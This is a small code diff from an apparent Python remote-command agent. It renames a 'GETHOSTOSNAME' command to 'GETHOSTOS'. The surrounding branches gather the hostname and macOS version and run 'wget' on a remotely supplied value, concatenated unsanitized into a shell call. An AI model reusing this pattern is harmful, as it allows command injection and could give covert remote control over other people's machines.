@@ -57,7 +57,7 @@ def main(argv):
 				quit()
 			elif command_type == "GETHOSTNAME":
 				result["content"] = (os.popen("hostname").read())
-			elif command_type == "GETHOSTOSNAME":
+			elif command_type == "GETHOSTOS":
 				result["content"] = (os.popen("sw_vers -productVersion").read())
 			elif command_type == "DOWNLOAD":
 				result["content"] = (os.popen("wget " + content).read())
